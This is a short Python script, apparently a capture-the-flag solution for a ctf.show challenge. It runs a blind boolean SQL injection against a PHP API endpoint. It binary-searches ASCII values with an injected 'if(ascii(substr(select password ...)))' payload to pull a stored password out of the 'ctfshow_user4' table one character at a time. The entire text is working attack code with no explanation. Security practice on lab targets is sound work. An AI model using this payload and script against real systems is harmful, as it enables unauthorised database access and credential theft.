import requests

url = "http://845cf956-1b2e-49c0-91af-a3dbd652b6ae.chall.ctf.show/api/v4.php?id=1' and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))>{mid},1,0)--+'
        r = requests.get(url + payload)
        if "admin" in r.text:
            head = mid + 1
            print(url+payload)
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

